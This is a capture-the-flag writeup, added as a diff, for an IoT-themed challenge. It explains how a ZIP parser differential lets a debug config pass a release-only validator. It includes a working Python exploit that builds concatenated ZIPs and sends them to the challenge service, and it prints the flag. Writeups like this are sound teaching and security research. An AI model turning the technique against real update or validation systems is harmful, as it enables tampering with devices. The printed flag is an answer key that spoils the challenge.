@@ -1,0 +1,93 @@
+---
+title: 'NDIAS 2026 - Weird config updater'
+description: 'Writeup for Weird config updater from NDIAS Automotive/IoT CTF 2026. A ZIP parser-differential between the validation and extraction paths lets a debug config slip through a release-only check.'
+date: 2026-05-16
+tags: ['writeup', 'misc', 'pwn', 'zip', 'parser-differential', 'python', 'ndias', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Misc
+**Service:** `nc 20.89.164.200 13337`
+**Serial:** `ae489873-895046f0-dac760e5`
+
+The service accepts a hex-encoded ZIP, validates that it contains a release-mode `config.json`, then extracts it. The `FLAG` command only succeeds when the extracted mode is `debug` — the exact opposite of what validation accepts.
+
+The bypass is a classic ZIP parser differential: validation reads the **last** archive in the byte stream, extraction reads the **first** archive. Concatenating a debug ZIP followed by a release ZIP gets the debug config extracted while the validator only ever sees the release config.
+
+## 1. Service Surface
+
+`HELP` after connecting shows two useful commands:
+
+```text
+UPLOAD <size>
+  read 2*<size> ASCII hex characters, verify uploaded ZIP, then extract it
+FLAG
+  show flag if mode == debug
+```
+
+A plain debug ZIP is rejected — the validator expects the SHA-256 of this exact file content for `config.json`:
+
+```json
+{"mode":"release"}
+```
+
+## 2. The Parser Differential
+
+The two ZIP readers in the service disagree about how to handle a byte stream that contains two valid ZIP archives back-to-back:
+
+- **Validation** finds the *last* archive (typical "find the end-of-central-directory and scan backwards" behaviour) and sees the release config.
+- **Extraction** opens the *first* archive (a more naive forward scan or a different library) and applies the debug config.
+
+So if I concatenate two ZIPs as raw bytes:
+
+```text
+payload = debug.zip + release.zip
+```
+
+the validator accepts the upload because the release `config.json` is present in the trailing archive, but extraction installs the debug `config.json` from the leading archive. After that, `FLAG` returns the flag.
+
+## 3. Exploit
+
+```python
+import binascii
+import io
+import socket
+import zipfile
+
+HOST = "20.89.164.200"
+PORT = 13337
+SERIAL = "ae489873-895046f0-dac760e5"
+
+
+def make_zip(config: bytes) -> bytes:
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
+        zf.writestr("config.json", config)
+    return buf.getvalue()
+
+
+debug_zip = make_zip(b'{"mode":"debug"}')
+release_zip = make_zip(b'{"mode":"release"}')
+payload = debug_zip + release_zip
+
+with socket.create_connection((HOST, PORT), timeout=5) as s:
+    s.sendall((SERIAL + "\n").encode())
+    s.recv(4096)
+
+    upload = f"UPLOAD {len(payload)}\n".encode()
+    upload += binascii.hexlify(payload) + b"\n"
+    s.sendall(upload)
+    print(s.recv(4096).decode(errors="replace"))
+
+    s.sendall(b"FLAG\n")
+    print(s.recv(4096).decode(errors="replace"))
+```
+
+## Flag
+
+```text
+FLAG{4n_1mp3r50n470r_h45_b33n_d3t3ct3d!}
+```
